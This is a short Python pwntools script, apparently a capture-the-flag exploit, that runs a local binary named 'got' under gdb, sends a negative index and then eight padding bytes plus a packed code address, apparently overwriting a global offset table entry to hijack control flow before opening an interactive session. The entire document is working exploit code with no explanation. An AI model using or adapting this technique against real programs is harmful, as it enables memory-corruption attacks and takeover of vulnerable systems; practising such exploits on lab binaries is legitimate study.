from pwn import *

i = process('./got')

gdb.attach(i, gdbscript='''
    b *0x4012B8
    continue
''')

i.sendlineafter('> ', b'-4')

payload = b'A' * 8
i.sendlineafter('> ', payload + p64(0x00000000004012B8))

i.interactive()
print(i.recvall())
